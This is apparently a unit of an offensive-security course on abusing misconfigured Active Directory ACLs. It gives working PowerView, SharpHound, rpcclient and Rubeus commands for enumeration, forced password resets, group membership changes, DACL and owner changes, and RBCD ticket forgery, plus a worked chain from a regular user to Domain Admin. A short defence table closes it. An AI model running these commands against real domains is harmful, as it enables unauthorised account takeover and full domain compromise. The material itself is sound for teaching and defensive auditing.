# Misconfigured Permissions (ACL Abuse)

## Unit 5 - Topic 3 | Privilege Escalation in AD

---

## Overview

**Misconfigured AD permissions (ACL abuse)** exploits overly permissive Access Control Lists on Active Directory objects. When users or groups have dangerous rights (like GenericAll, WriteDacl, or ForceChangePassword) on high-value objects, attackers can escalate privileges without exploiting any vulnerability.

---

## 1. Dangerous ACL Permissions

```
AD ACL ABUSE TAXONOMY:

FULL CONTROL:
├── GenericAll
│   ├── Complete control over object
│   ├── On user → reset password, set SPN, modify
│   ├── On group → add/remove members
│   ├── On computer → RBCD attack
│   └── On GPO → link malicious policy
│
├── GenericWrite
│   ├── Write any attribute
│   ├── On user → set SPN (targeted Kerberoast)
│   ├── On user → modify msDS-AllowedToActOnBehalfOfOtherIdentity
│   └── On computer → RBCD attack

SPECIFIC RIGHTS:
├── ForceChangePassword
│   └── Reset target user's password (no old password needed!)
│
├── WriteDacl
│   ├── Modify the object's permissions
│   └── Grant yourself GenericAll → full control!
│
├── WriteOwner
│   ├── Change object owner to yourself
│   └── As owner → grant yourself any permission
│
├── AddMember (WriteProperty on member attribute)
│   └── Add users/computers to the group
│
├── AllExtendedRights
│   ├── Includes ForceChangePassword
│   ├── Includes DS-Replication rights (DCSync!)
│   └── Very dangerous on domain object
│
└── WriteProperty (specific attributes)
    ├── servicePrincipalName → Kerberoast
    ├── msDS-AllowedToActOnBehalfOfOtherIdentity → RBCD
    └── member → Add to group
```

---

## 2. Finding Exploitable ACLs

```powershell
# === POWERVIEW ===
# Find ALL interesting ACLs:
Find-InterestingDomainAcl -ResolveGUIDs

# ACLs on specific object:
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | \
  select SecurityIdentifier, ActiveDirectoryRights, ObjectAceType

# ACLs for current user:
Find-InterestingDomainAcl -ResolveGUIDs | \
  Where-Object {$_.IdentityReferenceName -match "currentuser|mygroup"}

# Who has GenericAll on DA group:
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | \
  Where-Object {$_.ActiveDirectoryRights -match "GenericAll"} | \
  ForEach-Object {Convert-SidToName $_.SecurityIdentifier}

# Who can reset passwords:
Get-DomainObjectAcl -ResolveGUIDs | \
  Where-Object {$_.ObjectAceType -match "User-Force-Change-Password"} | \
  select @{N='Victim';E={$_.ObjectDN}}, \
         @{N='Attacker';E={Convert-SidToName $_.SecurityIdentifier}}

# === BLOODHOUND (Best Approach) ===
# Visual ACL abuse path discovery:
# 1. Run SharpHound with ACL collection
.\SharpHound.exe -c all
# 2. Import to BloodHound
# 3. Query: "Shortest Paths to Domain Admins from Owned"
# Shows ACL-based escalation paths automatically!
```

---

## 3. Exploiting ACL Misconfigurations

```powershell
# === GENERICALL ON USER ===
# Reset their password:
Set-DomainUserPassword -Identity target_user \
  -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)

# Or set SPN for Kerberoasting:
Set-DomainObject -Identity target_user \
  -SET @{serviceprincipalname='nonexistent/kerberoast'}
.\Rubeus.exe kerberoast /user:target_user

# === GENERICALL ON GROUP ===
# Add yourself to the group:
Add-DomainGroupMember -Identity "Domain Admins" -Members "attacker"
# Instant Domain Admin!

# === FORCECHANGEPASSWORD ===
# Reset password without knowing old one:
Set-DomainUserPassword -Identity target_user \
  -AccountPassword (ConvertTo-SecureString 'Hacked123!' -AsPlainText -Force)

# From Linux:
rpcclient dc01 -U 'attacker%pass' -c 'setuserinfo2 target_user 23 "Hacked123!"'

# === WRITEDACL ===
# Grant yourself GenericAll:
Add-DomainObjectAcl -TargetIdentity target_user \
  -PrincipalIdentity attacker -Rights All
# Now you have full control → reset password, etc.

# === WRITEOWNER ===
# Make yourself the owner:
Set-DomainObjectOwner -Identity "Domain Admins" \
  -OwnerIdentity attacker
# As owner, grant yourself WriteDacl:
Add-DomainObjectAcl -TargetIdentity "Domain Admins" \
  -PrincipalIdentity attacker -Rights All
# Add yourself to Domain Admins:
Add-DomainGroupMember -Identity "Domain Admins" -Members "attacker"

# === GENERICALL ON COMPUTER ===
# Resource-Based Constrained Delegation (RBCD):
# 1. Create machine account:
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString 'Pass123!' -AsPlainText -Force)
# 2. Set delegation:
Set-DomainObject -Identity target_computer \
  -SET @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=(Get-DomainComputer FAKE01).ObjectSID}
# 3. Request ticket as admin:
.\Rubeus.exe s4u /user:FAKE01$ /rc4:HASH \
  /impersonateuser:Administrator \
  /msdsspn:cifs/target_computer /ptt
```

---

## 4. ACL Attack Chain Example

```
COMPLETE ACL ABUSE CHAIN:

START: compromised_user (regular domain user)

STEP 1: Enumerate ACLs
BloodHound shows:
compromised_user → WriteDacl → helpdesk_group
helpdesk_group → ForceChangePassword → svc_backup
svc_backup → GenericAll → Domain Admins

STEP 2: Grant yourself rights on helpdesk_group
Add-DomainObjectAcl -TargetIdentity helpdesk_group \
  -PrincipalIdentity compromised_user -Rights All

STEP 3: Add yourself to helpdesk group
Add-DomainGroupMember -Identity helpdesk_group \
  -Members compromised_user

STEP 4: Reset svc_backup password
Set-DomainUserPassword -Identity svc_backup \
  -AccountPassword (ConvertTo-SecureString 'Pwned!' -AsPlainText -Force)

STEP 5: Authenticate as svc_backup
runas /user:corp\svc_backup cmd.exe

STEP 6: Add yourself to Domain Admins
Add-DomainGroupMember -Identity "Domain Admins" \
  -Members compromised_user

RESULT: Domain Admin from a regular user! No exploits needed!
```

---

## 5. Defense Against ACL Abuse

| Defense | Description |
|---------|-------------|
| **Audit ACLs** | Regular review of permissions on sensitive objects |
| **BloodHound** | Run BloodHound defensively to find ACL paths |
| **Least privilege** | Remove unnecessary permissions |
| **AdminSDHolder** | Protected objects auto-reset permissions |
| **Monitor changes** | Alert on ACL modifications (Event ID 5136) |
| **PingCastle** | Automated AD security assessment |

---

## Summary Table

| Permission | Abuse |
|-----------|-------|
| **GenericAll (user)** | Reset password, set SPN |
| **GenericAll (group)** | Add yourself as member |
| **WriteDacl** | Grant yourself full control |
| **WriteOwner** | Take ownership → full control |
| **ForceChangePassword** | Reset password directly |
| **GenericWrite** | Set SPN, modify delegation |

---

## Quick Revision Questions

1. **What is the most dangerous ACL permission on a group object?**
2. **How does WriteDacl lead to full control?**
3. **What tool best visualizes ACL abuse paths?**
4. **How can GenericAll on a computer be exploited?**
5. **What event ID tracks ACL modifications?**

---

[← Previous: Token Impersonation](02-token-impersonation.md) | [Next: Group Policy Exploitation →](04-group-policy-exploitation.md)

---

*Unit 5 - Topic 3 of 5 | [Back to README](../README.md)*
